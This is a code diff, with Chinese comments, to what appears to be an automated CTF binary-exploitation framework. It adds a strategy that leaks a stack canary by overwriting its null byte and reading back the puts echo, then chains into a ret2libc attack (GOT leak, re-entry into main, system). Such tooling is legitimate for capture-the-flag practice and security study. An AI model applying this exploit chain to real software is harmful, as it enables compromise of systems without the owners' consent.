@@ -806,6 +806,33 @@ def _fmt_offset(out: bytes) -> Optional[int]:
 
 
 # --------------------------------------------------------------------------- 辅助
+def s_canary_echo(ch: Challenge, f: Facts) -> Iterable[Plan]:
+    """canary + 「read 溢出 + puts(同 buf) 回显」结构（repeater 型）。
+
+    泄 canary 的原理：发 buf_size+1 字节盖掉 canary 最低位的 0x00，
+    puts 回显就会把 canary 高 7 字节带出来（LSB 在前重组）。
+    拿到 canary 后走 ret2libc 三阶段（同进程）：泄漏 GOT → 重入 main → system。
+    真正的执行在 orchestrator._try_canary_echo（泄漏值运行时才知道）。
+    """
+    if not ch.prot.canary or ch.elf.pie:
+        return
+    if f.echo_leak is None or ch.libc_elf is None:
+        return
+    leak_plt = ch.plt("puts")
+    got = ch.got("puts")
+    if not leak_plt or not got:
+        return
+    pop_rdi = f.gadgets.get("pop_rdi")
+    if ch.elf.bits == 64 and not pop_rdi:
+        return
+    v = f.vulns[f.echo_leak[0]]
+    if not v.func_entry:
+        return
+    yield Plan("canary_echo", [], tag=f"canaryecho:{v.offset}:{v.sink}",
+               desc=f"echo-leak canary -> ret2libc off={v.offset} "
+                    f"buf={f.echo_leak[1]} entry={hex(v.func_entry)}")
+
+
 def _writable(ch: Challenge) -> Optional[int]:
     """挑一块可写内存（bss 起点往后一点，避开已用数据）。"""
     try:
@@ -831,6 +858,7 @@ STRATEGIES = [
     s_shellcode,
     s_ret2syscall,
     s_ret2syscall_write,
+    s_canary_echo,
     s_fmtstr,
     # 兜底：只打 flag 的题（不计入 shell 成功率，单独记账）
     s_ret2win_flag,
